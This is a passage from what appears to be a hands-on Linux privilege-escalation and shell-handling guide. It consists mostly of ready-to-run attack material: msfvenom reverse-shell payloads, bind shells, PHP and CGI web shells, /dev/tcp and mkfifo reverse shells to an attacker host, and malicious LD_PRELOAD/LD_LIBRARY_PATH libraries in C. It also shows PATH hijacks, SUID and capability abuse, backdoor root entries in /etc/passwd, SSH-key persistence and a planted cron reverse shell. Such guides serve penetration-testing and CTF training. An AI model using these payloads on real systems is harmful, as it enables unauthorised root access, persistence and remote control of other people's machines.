# Attacker: python3 -m http.server 8000
# Victim: wget http://LHOST:8000/socat -O /tmp/socat; chmod +x /tmp/socat
```

## 5.11 MSFvenom Payloads

```bash
# List all Linux payloads
msfvenom -l payloads | grep linux

# ELF binary reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf
chmod +x shell.elf
./shell.elf

# ELF with Meterpreter (more features)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o meter.elf

# Python payload
msfvenom -p cmd/unix/reverse_python LHOST=LHOST LPORT=LPORT -f raw

# Bash payload
msfvenom -p cmd/unix/reverse_bash LHOST=LHOST LPORT=LPORT -f raw

# PHP payload  
msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw > shell.php

# Listener in Metasploit:
# msfconsole
# use exploit/multi/handler
# set payload linux/x64/shell_reverse_tcp
# set LHOST LHOST
# set LPORT LPORT
# run
```

---

# Chapter 6: Shell Stabilization & Upgrading

## 6.1 Why Stabilize?

A raw netcat shell is fragile:
- Ctrl+C kills your connection (not the remote command)
- No arrow keys or command history
- Tab completion doesn't work
- Some commands fail requiring a proper TTY

## 6.2 Method 1: Python PTY (Most Common)

```bash
# Step 1: Spawn PTY with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Or Python 2:
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the netcat connection
Ctrl+Z
# (Your shell is now in background)

# Step 3: Get your terminal settings & set raw mode
echo $TERM             # Note this value (usually xterm-256color)
stty -a                # Note rows and columns
stty raw -echo         # Raw mode: passes ALL input through (no local echo)
fg                     # Bring netcat back to foreground

# Step 4: Reset terminal and set variables (type these on the REMOTE shell)
reset                  # Reset terminal (might not show what you type — that's OK)
export SHELL=bash
export TERM=xterm-256color
stty rows 38 cols 116  # Set to your terminal size (stty -a showed these)
```

**Why this works:**
- `pty.spawn()` creates a pseudo-terminal on the remote side
- `stty raw -echo` tells YOUR terminal to stop processing input (pass raw)
- Now keystrokes go directly to the remote PTY
- `fg` brings the raw connection back, but now it has a PTY on both ends

## 6.3 Method 2: Socat Upgrade (Best)

```bash
# On attacker — start socat listener instead of nc:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On victim — use socat to connect (if available):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444

# If socat not installed on victim, upload it:
# Attacker:
python3 -m http.server 8000
# Victim:
wget http://LHOST:8000/socat -O /tmp/socat && chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444
```

## 6.4 Method 3: Script Command

```bash
# /usr/bin/script creates a PTY for logging sessions
# We abuse it to get a PTY:
script -qc /bin/bash /dev/null
# Or:
script /dev/null -c bash
```

## 6.5 Method 4: stty without Python

```bash
# If python not available, try:
/usr/bin/script -q -c "/bin/bash" /dev/null
# Then do the stty raw -echo dance as above
```

## 6.6 Method 5: Using expect

```bash
expect -c 'spawn bash; interact'
```

## 6.7 Method 6: SSH Upgrade (Best for Persistence)

If you have write access to `~/.ssh/authorized_keys`:

```bash
# On ATTACKER: generate SSH key pair
ssh-keygen -t rsa -b 4096 -f /tmp/target_key -N ""
# (-N "" = no passphrase)

# Get the public key:
cat /tmp/target_key.pub
# Output: ssh-rsa AAAAB3NzaC1yc2E... attacker@machine

# On VICTIM: add your public key
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# SSH in from attacker with full TTY:
ssh -i /tmp/target_key user@TARGET_IP
```

## 6.8 Method 7: rlwrap

```bash
# On attacker — wrap netcat with readline:
rlwrap nc -lvnp 4444

# Now your LOCAL terminal provides arrow keys and history
# (partial solution — still not full PTY on remote side)
```

---

# Chapter 7: Bind Shells, Web Shells & Named Pipe Shells

## 7.1 Bind Shells

A bind shell opens a port on the TARGET and waits for the attacker to connect.

```
ATTACKER                    VICTIM
192.168.1.10               192.168.1.20:4444 (listening)

nc VICTIM_IP 4444 →→→→→→→  nc -lvnp 4444 -e /bin/bash
(connecting)                 (listening)
```

```bash
# Victim sets up bind shell:
nc -lvnp 4444 -e /bin/bash              # If nc has -e
nc -lvnp 4444 -e /bin/sh               

# Without -e flag (OpenBSD nc):
rm /tmp/f; mkfifo /tmp/f; nc -l -p 4444 < /tmp/f | /bin/bash 2>&1 > /tmp/f

# Python bind shell:
python3 -c '
import socket,subprocess,os,threading
s=socket.socket()
s.bind(("0.0.0.0",4444))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
import pty; pty.spawn("/bin/bash")
'

# Attacker connects:
nc VICTIM_IP 4444
```

## 7.2 Web Shells

Web shells allow command execution via HTTP requests. Useful when you can write to a web directory.

### 7.2.1 PHP Web Shells

```php
<!-- Minimal one-liner: -->
<?php system($_GET['cmd']); ?>

<!-- With output formatting: -->
<?php echo "<pre>".shell_exec($_GET['cmd'])."</pre>"; ?>

<!-- POST method (harder to see in logs): -->
<?php system($_POST['cmd']); ?>

<!-- Using passthru (returns raw output): -->
<?php passthru($_GET['cmd']); ?>

<!-- eval-based (obfuscated): -->
<?php eval(base64_decode($_GET['cmd'])); ?>

<!-- Full-featured web shell: -->
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo '<pre>';
    $result = shell_exec($cmd);
    echo htmlspecialchars($result);
    echo '</pre>';
} else {
    echo '<form method="GET"><input name="cmd" /><input type="submit" /></form>';
}
?>
```

**Usage:**
```bash
# Execute commands via curl:
curl "http://target/shell.php?cmd=id"
curl "http://target/shell.php?cmd=cat+/etc/passwd"
curl "http://target/shell.php?cmd=bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261"

# URL encoding reference:
# space = +  or  %20
# &     = %26
# >     = %3E
# <     = %3C
# /     = %2F
```

### 7.2.2 Python Web Shell (CGI)

```python
#!/usr/bin/env python3
# webshell.py (place in /usr/lib/cgi-bin/ or similar)
import os, cgi, sys

print("Content-Type: text/html\n")
form = cgi.FieldStorage()
cmd = form.getvalue('cmd', 'id')
print("<pre>" + os.popen(cmd).read() + "</pre>")
```

### 7.2.3 Upgrading Web Shell to Reverse Shell

```bash
# Step 1: Send reverse shell command via web shell
curl "http://target/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261'"

# Or with URL encoding:
curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'" http://target/shell.php

# Step 2: Catch on listener:
nc -lvnp LPORT
```

## 7.3 Named Pipe Shell (mkfifo)

```bash
# How mkfifo reverse shell works step by step:
rm -f /tmp/f            # Remove old pipe if exists
mkfifo /tmp/f           # Create named pipe (FIFO) at /tmp/f

# These run simultaneously (shell handles via piping):
cat /tmp/f |            # Read from pipe → feed to sh as stdin
/bin/sh -i 2>&1 |       # Execute sh, merge stderr with stdout
nc LHOST LPORT > /tmp/f # Send output to attacker, write attacker input to pipe

# The loop:
# 1. Attacker types command → goes over nc → written to /tmp/f
# 2. cat reads from /tmp/f → stdin of /bin/sh
# 3. sh executes command → output to nc
# 4. nc sends output to attacker
```

---

---

# PART III — ENVIRONMENT VARIABLES & PATH EXPLOITATION

---

# Chapter 8: Environment Variables — Complete Guide

## 8.1 What Are Environment Variables?

Environment variables are **named string values** stored in a process's environment block, inherited by child processes. They configure program behavior without modifying source code.

```bash
# View all environment variables
env
printenv
set | grep -v ' ()'   # Exclude functions, show variables only

# Set a variable
export MYVAR="hello"          # Set and export (children see it)
MYVAR="hello"                 # Set but NOT exported (only current shell)
export MYVAR                  # Export previously set variable

# View one variable
echo $MYVAR
printenv MYVAR

# Unset a variable
unset MYVAR

# Temporary variable for one command:
MYVAR="test" somecommand      # Only set for this one command
```

## 8.2 Critical Environment Variables for Privilege Escalation

### 8.2.1 PATH

The most exploited environment variable. Defines where the shell looks for executables.

```bash
echo $PATH
# Example: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Shell searches each directory LEFT TO RIGHT
# If /tmp is first: /tmp/ls runs before /bin/ls
```

**How PATH hijacking works:**
1. A SUID script/binary calls `ls`, `cat`, `python`, etc. WITHOUT full path
2. You put your malicious version earlier in PATH
3. The SUID program runs YOUR malicious file as root

```bash
# Step 1: Find SUID binaries that call commands without full path
# Look at strings output or decompile:
strings /usr/local/bin/suid_binary | grep -E "^[a-z]"
# If you see: "ls" or "cat" (no / prefix) = vulnerable

# Step 2: Create malicious script with same name
echo '/bin/bash -p' > /tmp/ls       # -p = keep EUID (don't drop root)
echo '#!/bin/bash' > /tmp/cat
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /tmp/cat
chmod +x /tmp/ls /tmp/cat

# Step 3: Prepend your directory to PATH
export PATH=/tmp:$PATH

# Step 4: Run the SUID binary
/usr/local/bin/suid_binary           # It calls "ls" → finds /tmp/ls first → runs as root!
```

### 8.2.2 LD_PRELOAD

Specifies a shared library to load BEFORE all others. Functions in it **override** standard library functions.

```bash
echo $LD_PRELOAD
```

**LD_PRELOAD for privilege escalation:**

```
Security note: LD_PRELOAD is IGNORED for SUID binaries by the dynamic linker
UNLESS the binary is owned by the same user as the preloaded library.
HOWEVER: If sudo allows running a program with env_keep+=LD_PRELOAD, it works!
```

**Attack scenario:**

```bash
# Check sudo permissions:
sudo -l
# Output includes:
# env_keep+=LD_PRELOAD
# (root) NOPASSWD: /usr/bin/find

# Create malicious shared library:
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

// This runs before any other code when library is loaded
void _init() {
    unsetenv("LD_PRELOAD");    // Clean up so we don't get into a loop
    setresuid(0, 0, 0);        // Set all UIDs to root
    setresgid(0, 0, 0);        // Set all GIDs to root
    system("/bin/bash -p");    // Spawn root shell
}
EOF

# Compile as shared library:
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# Exploit via sudo:
sudo LD_PRELOAD=/tmp/evil.so find .
# → root shell spawns!
```

**Explanation of compilation flags:**
```
gcc flags explained:
-fPIC          → Position Independent Code (required for shared libs)
-shared        → Create a shared library (.so) not an executable
-nostartfiles  → Don't link standard startup files (we have _init instead)
-o output.so   → Output filename
```

### 8.2.3 LD_LIBRARY_PATH

Specifies additional directories to search for shared libraries.

```bash
echo $LD_LIBRARY_PATH
```

**Attack scenario:**

```bash
# Find what libraries a SUID binary loads:
ldd /usr/local/bin/suid_binary
# Output:
#   linux-vdso.so.1 (0x...)
#   libcustom.so => not found     ← MISSING LIBRARY!
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# If a library is "not found", we can provide it!
# Find what functions it expects:
nm -D /usr/local/bin/suid_binary 2>/dev/null | grep "U "   # Undefined = imported

# Create our version of the library:
cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Any function the binary calls from this lib:
int custom_function() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc -fPIC -shared -o /tmp/libcustom.so /tmp/libcustom.c

# Set LD_LIBRARY_PATH to find our library first:
export LD_LIBRARY_PATH=/tmp
/usr/local/bin/suid_binary   # Loads our evil libcustom.so!
```

### 8.2.4 Other Exploitable Environment Variables

```bash
# PYTHONPATH — Python module search path
export PYTHONPATH=/tmp
# If a root-run Python script does "import module", and we have
# /tmp/module.py containing malicious code, it gets executed as root!

# Example:
cat > /tmp/os.py << 'EOF'
import pty, socket, os
os.system('bash -p')
EOF
PYTHONPATH=/tmp python3 /opt/rootscript.py

# PERL5LIB / PERLLIB — Perl module path
export PERL5LIB=/tmp
cat > /tmp/SomeModule.pm << 'EOF'
package SomeModule;
system('bash -p');
1;
EOF

# RUBYLIB — Ruby library path
export RUBYLIB=/tmp

# NODE_PATH — Node.js module path
export NODE_PATH=/tmp

# JAVA_TOOL_OPTIONS — JVM startup options
export JAVA_TOOL_OPTIONS='-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=4444'

# IFS (Internal Field Separator) — affects word splitting
# Default is space, tab, newline
# If a script does: for x in $var; do $x; done
# Setting IFS to a specific char can inject commands

# PS4 — Bash PS4 prompt (shown during -x debug mode)
# If a script runs: bash -x /script.sh
# You can inject commands via PS4:
export PS4='$(id > /tmp/pwned)_'
bash -x /path/to/script

# BASH_ENV — executed before bash scripts in non-interactive mode
export BASH_ENV=/tmp/evil.sh
echo 'bash -p' > /tmp/evil.sh
chmod +x /tmp/evil.sh
# Now running ANY bash script will execute /tmp/evil.sh first!
bash /path/to/script.sh

# ENV — similar to BASH_ENV, for /bin/sh
export ENV=/tmp/evil.sh
sh /path/to/script.sh
```

## 8.3 Complete Environment Variable Reference

Here is every significant env variable a user can set, categorized:

### Shell Variables
```bash
SHELL=/bin/bash          # Current shell
BASH_VERSION=5.1.16     # Bash version
PS1='$ '                 # Primary prompt
PS2='> '                 # Continuation prompt
PS3='#? '               # select loop prompt
PS4='+ '                 # Debug mode prefix (exploitable!)
HISTSIZE=1000            # History command count
HISTFILE=~/.bash_history # History file location
HISTFILESIZE=2000        # Max history file lines
HISTIGNORE="ls:pwd:*"   # Patterns not saved to history
HISTCONTROL=ignoredups   # History dedup behavior
IFS=$' \t\n'            # Internal Field Separator (exploitable!)
BASH_ENV=/tmp/evil.sh   # Executed for non-interactive bash (exploitable!)
ENV=/tmp/evil.sh         # For sh (exploitable!)
CDPATH=.:~:/opt          # cd search path
MAIL=/var/spool/mail/alice  # Mail file location
MAILCHECK=60             # How often to check mail (seconds)
```

### Program Search & Library Variables
```bash
PATH=/usr/bin:/bin:...   # Executable search path (HIGH VALUE TARGET)
LD_PRELOAD=/evil.so      # Preload shared library (HIGH VALUE TARGET)
LD_LIBRARY_PATH=/tmp     # Library search path (HIGH VALUE TARGET)
LD_DEBUG=all             # Debug dynamic linker (information gathering)
LD_SHOW_AUXV=1           # Show auxiliary vector

PYTHONPATH=/tmp          # Python module path (exploitable!)
PYTHONSTARTUP=/tmp/s.py  # Python startup script (exploitable!)
PYTHON_EGG_CACHE=/tmp    # Egg cache location
PYTHONHOME=/tmp          # Python home directory

PERL5LIB=/tmp            # Perl module path (exploitable!)
PERLLIB=/tmp             # Perl library path (exploitable!)
PERL5OPT=-M/tmp/Evil     # Perl command-line options

RUBYLIB=/tmp             # Ruby library path (exploitable!)
GEM_HOME=/tmp            # RubyGems home
GEM_PATH=/tmp            # RubyGems path

NODE_PATH=/tmp           # Node.js module path (exploitable!)
NODE_OPTIONS='--require /tmp/evil.js'  # Node options (exploitable!)

JAVA_TOOL_OPTIONS=...    # JVM tool options
_JAVA_OPTIONS=...        # JVM options (alternative)
JDK_JAVA_OPTIONS=...     # JDK options

GOPATH=/tmp/go           # Go workspace
GOPROXY=http://attacker  # Go module proxy (MITM attacks!)
```

### Network Variables
```bash
http_proxy=http://proxy:8080    # HTTP proxy
https_proxy=http://proxy:8080   # HTTPS proxy
HTTP_PROXY=http://proxy:8080    # Alternative case
no_proxy=localhost,127.0.0.1    # Bypass proxy for these
ftp_proxy=ftp://proxy:21        # FTP proxy
ALL_PROXY=socks5://proxy:1080   # All protocols
SOCKS_PROXY=socks5://proxy:1080 # SOCKS proxy
CURL_CA_BUNDLE=/tmp/fake.crt    # curl cert bundle (MITM!)
```

### Application-Specific
```bash
EDITOR=vim                      # Default editor
VISUAL=nano                     # Visual editor
PAGER=less                      # Pager for man pages
TERM=xterm-256color             # Terminal type
COLORTERM=truecolor             # Color support
DISPLAY=:0                      # X11 display

# Web application variables (look in .env files!)
DATABASE_URL=postgres://user:pass@host/db
DB_PASSWORD=secret
DB_HOST=localhost
SECRET_KEY=mysecretkey
API_KEY=abc123
JWT_SECRET=jwt_secret_here
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=...
REDIS_URL=redis://localhost:6379
SMTP_PASSWORD=emailpassword
```

---

# Chapter 9: PATH Hijacking

## 9.1 PATH Hijacking Theory

PATH hijacking is one of the most common and elegant privilege escalation techniques. It exploits the fact that programs often call other programs using relative names (just `ls` instead of `/bin/ls`).

```
The shell (or program) searches PATH left to right for executables.
If we control a directory BEFORE the real directory, our binary runs first.
```

## 9.2 Finding Vulnerable SUID Binaries

```bash
# Step 1: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Step 2: Examine each with strings to find called commands
strings /usr/local/bin/target | grep -v "^/" | grep -E "^[a-zA-Z]"
# Commands without leading / are PATH-relative = potentially exploitable

# Step 3: Run with strace to see system calls
strace -e execve /usr/local/bin/target 2>&1 | grep execve
# Look for execve calls that don't use full paths

# Step 4: Use ltrace (library call trace)
ltrace /usr/local/bin/target 2>&1 | grep -E "system|exec|popen"
# system("ls") → vulnerable!
# system("/bin/ls") → not vulnerable (full path)
```

## 9.3 Full PATH Hijacking Walkthrough

### Scenario: SUID binary calls `service` without full path

```bash
# Enumeration revealed:
strings /usr/local/bin/adminscript | grep -v /
# Output: service, restart, apache

# Confirmed — it calls "service" without full path

# Create malicious 'service' binary:
cat > /tmp/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service

# Hijack PATH:
export PATH=/tmp:$PATH
echo $PATH   # Verify /tmp is first: /tmp:/usr/local/sbin:/usr/local/bin:...

# Execute the SUID binary:
/usr/local/bin/adminscript
# → Calls service → Finds /tmp/service first → Runs as SUID owner (root!)
# → Root bash shell!
```

### Scenario: Script uses relative Python import

```bash
# /opt/monitor.py (runs as root via cron):
# import os
# os.system("service nginx status")

# Same attack — put malicious 'service' in PATH
export PATH=/tmp:$PATH
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
```

## 9.4 Python Script PATH Hijacking

```bash
# Target script /opt/backup.py (SUID or run as root):
# #!/usr/bin/env python3
# import subprocess
# subprocess.call(["tar", "-czf", "/backup/all.tar.gz", "/"])

# Tar is called without full path!
cat > /tmp/tar << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/opt/backup.py   # tar → /tmp/tar → creates SUID bash

# Get root:
/tmp/rootbash -p
```

---

# Chapter 10: LD_PRELOAD, LD_LIBRARY_PATH Exploitation

## 10.1 Understanding the Dynamic Linker

When a program starts, the dynamic linker (`ld.so`) loads all required shared libraries. The search order is:

```
1. LD_PRELOAD (if set and not SUID)
2. LD_LIBRARY_PATH directories
3. RPATH embedded in the binary (from compilation)
4. /etc/ld.so.cache (index of library directories)
5. Default paths: /lib, /usr/lib, /lib64, /usr/lib64
```

## 10.2 Writing Malicious Shared Libraries

### 10.2.1 Function Override Attack

```c
// evil.c — overrides the 'puts' function in libc
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

// Our evil puts() replaces the real one
int puts(const char *str) {
    static int (*original_puts)(const char *) = NULL;
    
    if (!original_puts) {
        // Load the REAL puts from the next library in chain
        original_puts = dlsym(RTLD_NEXT, "puts");
    }
    
    // Our payload:
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    
    // Call original to avoid breaking the program (stealth)
    return original_puts(str);
}

// Compile:
// gcc -fPIC -shared -o evil.so evil.c -ldl
```

### 10.2.2 _init Hook (Runs on Library Load)

```c
// init_hook.c — runs as soon as library is loaded
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// __attribute__((constructor)) runs before main()
__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD");    // Remove so subprocesses aren't affected
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/bash -p");
}

// Compile:
// gcc -fPIC -shared -o init_hook.so init_hook.c
// Use:
// LD_PRELOAD=./init_hook.so ./target_binary
```

## 10.3 sudo env_keep Exploitation

The most common LD_PRELOAD attack path requires a specific sudo configuration:

```bash
# Vulnerable sudo config in /etc/sudoers:
Defaults env_keep+=LD_PRELOAD
alice ALL=(root) NOPASSWD: /usr/bin/apache2

# This means: LD_PRELOAD is preserved when running sudo!
```

**Full exploit:**

```bash
# 1. Confirm vulnerable sudo -l output:
sudo -l
# Matching Defaults entries for alice:
#   env_keep+=LD_PRELOAD
# User alice may run the following commands:
#   (root) NOPASSWD: /usr/bin/apache2

# 2. Write malicious library:
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# 3. Compile:
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# 4. Exploit:
sudo LD_PRELOAD=/tmp/shell.so apache2
# → _init() runs as root → /bin/bash -p → root shell!
```

---

# PART IV — FILE PERMISSION EXPLOITATION

---

# Chapter 11: SUID/SGID Binaries — Full Exploitation

## 11.1 How SUID Works in Detail

```bash
# When you run: /usr/bin/passwd (which has SUID root)
# 1. Kernel sees SUID bit is set
# 2. Kernel sets EUID = file owner (root, UID 0)
# 3. Process runs with ROOT effective permissions
# 4. passwd can now modify /etc/shadow (root-only file)

# Verify SUID on passwd:
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root ... /usr/bin/passwd
#    ^--- 's' = SUID bit set

# See effective UID inside:
/usr/bin/id   # Shows your UID
# But a SUID binary running /usr/bin/id would show root!
```

## 11.2 Finding and Researching SUID Binaries

```bash
# Find all SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Common legitimate SUID binaries (usually safe):
# /usr/bin/passwd, /usr/bin/sudo, /usr/bin/newgrp
# /usr/bin/gpasswd, /usr/bin/chfn, /usr/bin/chsh
# /bin/mount, /bin/umount, /bin/su, /bin/ping

# SUSPICIOUS SUID binaries (check these!):
# /usr/bin/python, /usr/bin/perl, /usr/bin/ruby  → scripting languages!
# /usr/bin/vim, /usr/bin/nano, /usr/bin/less     → text editors!
# /usr/bin/find                                   → find command!
# /usr/bin/cp, /usr/bin/mv                       → file operations!
# /usr/bin/nmap                                   → network scanner!
# /usr/bin/wget, /usr/bin/curl                   → download tools!
# Anything in /opt/, /home/, /tmp/              → non-standard!

# Research unknowns at: https://gtfobins.github.io/
```

## 11.3 GTFOBins — The SUID Bible

GTFOBins (https://gtfobins.github.io/) documents how to exploit misconfigured binaries. Here are the most important ones:

### 11.3.1 bash / sh

```bash
# If /bin/bash has SUID set:
bash -p              # -p = privileged mode (preserves EUID)
/bin/bash -p         # Full path

# Check:
ls -la /bin/bash
# If -rwsr-xr-x: run bash -p and you're root!
```

### 11.3.2 find

```bash
# SUID find → execute as owner
find . -exec /bin/bash -p \; -quit
find / -name something -exec /bin/bash -p \;

# Or: drop into sh with -exec
find . -exec /bin/sh -p \; -quit
```

### 11.3.3 vim / vi

```bash
# SUID vim → use :! to run shell commands as root
vim -c ':!/bin/bash -p'

# Or inside vim:
# :set shell=/bin/bash
# :shell

# vim's Python interface:
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'
```

### 11.3.4 python / python3

```bash
# SUID Python — instant root shell:
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# With setuid:
python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
```

### 11.3.5 perl

```bash
# SUID Perl:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
perl -e 'exec "/bin/bash -p";'
```

### 11.3.6 ruby

```bash
# SUID Ruby:
ruby -e 'exec "/bin/bash -p"'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### 11.3.7 nmap

```bash
# SUID nmap (older versions had interactive mode):
nmap --interactive          # Old nmap (< 5.21)
nmap> !sh                   # Execute shell

# Newer nmap via script:
echo "os.execute('/bin/bash -p')" > /tmp/shell.nse
nmap --script=/tmp/shell.nse localhost
```

### 11.3.8 less / more

```bash
# SUID less → can shell out:
less /etc/passwd
# Inside less, press: !/bin/bash -p

# Or: LESSSECURE=1 blocks this — check if variable is set

# SUID more:
more /etc/passwd
# Inside more: !/bin/bash -p
```

### 11.3.9 nano

```bash
# SUID nano → write to root-owned files!
nano /etc/passwd            # Now you can edit /etc/passwd as root!
nano /etc/shadow            # Read/modify password hashes!

# Write SUID bash to get persistent root:
# Inside nano: Ctrl+R (Read file), Ctrl+X (Execute):
nano -l /etc/passwd
# Add: hacker::0:0:hacker:/root:/bin/bash
# Then: su hacker (no password = root!)

# Or add your public key to /root/.ssh/authorized_keys
```

### 11.3.10 cp / mv

```bash
# SUID cp → copy files as root!

# Attack 1: Overwrite /etc/passwd with our version
cp /etc/passwd /tmp/passwd.bak
echo 'hacker::0:0:hacker:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd     # Overwrites as root!
su hacker                           # No password!

# Attack 2: Copy your SSH key to root's authorized_keys
mkdir -p /tmp/ssh
echo "YOUR_SSH_PUB_KEY" > /tmp/ssh/authorized_keys
chmod 700 /tmp/ssh
chmod 600 /tmp/ssh/authorized_keys
cp -r /tmp/ssh /root/.ssh
```

### 11.3.11 chmod

```bash
# SUID chmod → change permissions as root!

# Make /etc/shadow readable by everyone:
chmod 777 /etc/shadow
cat /etc/shadow     # Now readable! Crack hashes offline.

# Make /etc/passwd writable by everyone:
chmod 777 /etc/passwd

# Create SUID bash copy:
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash    # Set SUID on the copy
/tmp/rootbash -p          # Run with -p for privileged mode!
```

### 11.3.12 tar

```bash
# SUID tar → execute commands via checkpoint:
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# Or with -p to preserve privileges:
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='bash -p'
```

### 11.3.13 awk

```bash
# SUID awk:
awk 'BEGIN {system("/bin/bash -p")}'
```

### 11.3.14 man

```bash
# SUID man → less is the pager → shell out:
man passwd
# Inside: !/bin/bash -p
```

### 11.3.15 wget / curl

```bash
# SUID wget → overwrite files as root!

# Attack: Overwrite /etc/crontab
# 1. Create malicious crontab on your machine:
echo '* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1' > /tmp/crontab
# 2. Serve it:
python3 -m http.server 8000
# 3. On victim (SUID wget):
wget http://LHOST:8000/crontab -O /etc/crontab

# SUID curl:
curl http://LHOST:8000/crontab -o /etc/crontab
```

### 11.3.16 Custom SUID Binary Exploitation

When you find a custom SUID binary not in GTFOBins:

```bash
# Step 1: Examine with strings
strings /usr/local/bin/custom_suid
# Look for: filenames, commands, function names

# Step 2: Check with ltrace (library calls)
ltrace /usr/local/bin/custom_suid

# Step 3: Check with strace (system calls)
strace /usr/local/bin/custom_suid 2>&1 | head -50

# Step 4: Look for buffer overflows (basic check)
/usr/local/bin/custom_suid $(python3 -c 'print("A"*1000)')

# Step 5: Check for path injection
strace /usr/local/bin/custom_suid 2>&1 | grep execve
# If you see execve("service", ...) or execve("ls", ...) → PATH hijack!
```

---

# Chapter 12: Linux Capabilities

## 12.1 What Are Capabilities?

Linux capabilities break up root's privileges into smaller pieces. Instead of needing full root (UID 0), a binary can be granted only specific kernel privileges.

```bash
# Traditional: either root (all-powerful) OR unprivileged
# Capabilities: fine-grained privilege assignment

# List all capabilities:
man capabilities

# Key capabilities:
CAP_SETUID      # Can change UID (become root!)
CAP_SETGID      # Can change GID
CAP_NET_BIND_SERVICE  # Can bind to ports < 1024
CAP_NET_RAW     # Can create raw sockets (port scanning!)
CAP_DAC_OVERRIDE  # Can bypass file read/write/execute checks!
CAP_DAC_READ_SEARCH  # Can bypass file read + directory permission checks
CAP_CHOWN       # Can change file ownership
CAP_FOWNER      # Bypass permission checks for file owner
CAP_SYS_ADMIN   # Many admin ops (mount, sethostname, etc.) — nearly root!
CAP_SYS_PTRACE  # Can trace any process (read memory!)
CAP_SYS_MODULE  # Can load kernel modules (= root!)
```

**Capability sets (effective/permitted/inheritable):**
```
Effective (e):   Currently active capabilities
Permitted (p):   Maximum capabilities the process can have
Inheritable (i): Capabilities passed to exec'd programs

Notation: cap_setuid+ep = cap_setuid in effective AND permitted sets
```

## 12.2 Finding Files with Capabilities

```bash
# Find ALL files with capabilities set:
getcap -r / 2>/dev/null

# Example vulnerable output:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl      = cap_setuid+ep  
# /usr/bin/ruby2.7   = cap_setuid+ep
# /usr/sbin/tcpdump  = cap_net_raw+ep
# /usr/bin/ping      = cap_net_raw+ep (normal)
# /usr/bin/vim.basic = cap_dac_override+ep  ← dangerous!
# /usr/bin/node      = cap_net_bind_service+ep (less dangerous)
```

## 12.3 Exploiting Dangerous Capabilities

### 12.3.1 cap_setuid

Can change to any UID — directly means root!

```bash
# Python with cap_setuid:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid:
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Ruby with cap_setuid:
/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### 12.3.2 cap_dac_override

Can bypass ALL file permission checks (read/write/execute any file)!

```bash
# vim with cap_dac_override:
/usr/bin/vim /etc/shadow      # Read shadow file (any root-only file)
/usr/bin/vim /etc/sudoers     # Edit sudoers!
/usr/bin/vim /root/.ssh/authorized_keys   # Add your SSH key

# Python with cap_dac_override:
python3 -c "print(open('/etc/shadow').read())"

# Write to /etc/passwd to add root user:
python3 -c "
f = open('/etc/passwd', 'a')
f.write('hacker::0:0:hacker:/root:/bin/bash\n')
f.close()
"
su hacker   # No password — root!
```

